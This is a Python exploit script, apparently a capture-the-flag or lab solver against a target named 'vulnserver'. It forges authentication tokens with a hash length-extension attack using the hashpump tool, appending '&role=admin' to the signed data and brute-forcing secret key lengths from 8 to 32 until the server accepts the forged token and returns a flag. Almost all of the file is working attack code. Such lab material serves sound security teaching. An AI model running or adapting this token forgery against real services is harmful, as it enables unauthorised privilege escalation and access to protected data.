#!/usr/bin/env python3
import sys
import time
import requests
import base64
import subprocess
import codecs

# Configuration
TARGET_URL = "http://vulnserver:5000"

def get_token():
    try:
        r = requests.get(f"{TARGET_URL}/get_token")
        r.raise_for_status()
        return r.json()
    except Exception as e:
        print(f"[!] Error getting token: {e}")
        sys.exit(1)

def forge_token(original_token, key_len):
    # original_token is base64( data + "." + mac )
    # We need to pad it first just in case
    token_b64 = original_token + "=" * ((4 - len(original_token) % 4) % 4)
    raw = base64.b64decode(token_b64)
    
    if b"." not in raw:
        return None
    
    data_bytes, mac_bytes = raw.rsplit(b".", 1)
    original_mac = mac_bytes.decode("utf-8")
    original_data = data_bytes.decode("latin-1")
    
    # Run hashpump
    # hashpump -s <mac> -d <data> -a <append> -k <keylen>
    cmd = [
        "hashpump",
        "-s", original_mac,
        "-d", original_data,
        "-a", "&role=admin",
        "-k", str(key_len)
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, check=True)
    except subprocess.CalledProcessError:
        return None
        
    output_str = result.stdout.decode("utf-8")
    new_mac = output_str[:64]
    remaining = output_str[64:]
    
    # Strip leading/trailing newlines that hashpump adds
    if remaining.startswith("\n"):
        remaining = remaining[1:]
    
    # Unescape hashpump output
    try:
        new_data_str = codecs.decode(remaining, "unicode_escape")
        new_data_bytes = new_data_str.encode("latin-1")
    except:
        new_data_bytes = remaining.encode("latin-1")
        
    if new_data_bytes.endswith(b"\n"):
        new_data_bytes = new_data_bytes[:-1]

    # Construct new token
    # base64( new_data + "." + new_mac )
    payload = new_data_bytes + b"." + new_mac.encode()
    return base64.b64encode(payload).decode()

def main():
    print("[*] Waiting for vulnserver...")
    while True:
        try:
            requests.get(f"{TARGET_URL}/get_token")
            break
        except:
            time.sleep(1)
            
    print("[+] Vulnserver is up.")
    
    info = get_token()
    token = info["token"]
    print(f"[*] Got token: {token}")
    
    found = False
    
    # Iterate key lengths
    for k in range(8, 33):
        print(f"[*] Trying keylen={k}...", end=" ", flush=True)
        
        forged = forge_token(token, k)
        if not forged:
            print("Failed to forge.")
            continue
            
        # Test it
        try:
            r = requests.post(f"{TARGET_URL}/resource", json={"token": forged})
            resp = r.json()
            
            if resp.get("ok"):
                print("SUCCESS!")
                print(f"[+] Flag found: {resp.get('secret')}")
                found = True
                break
            else:
                print(f"Failed ({resp.get('error')})")
        except Exception as e:
            print(f"Error sending request: {e}")
            
    if not found:
        print("[-] Attack failed. Could not find key length.")
        
    # Keep container alive for manual inspection
    subprocess.run(["/bin/bash"])

if __name__ == "__main__":
    main()
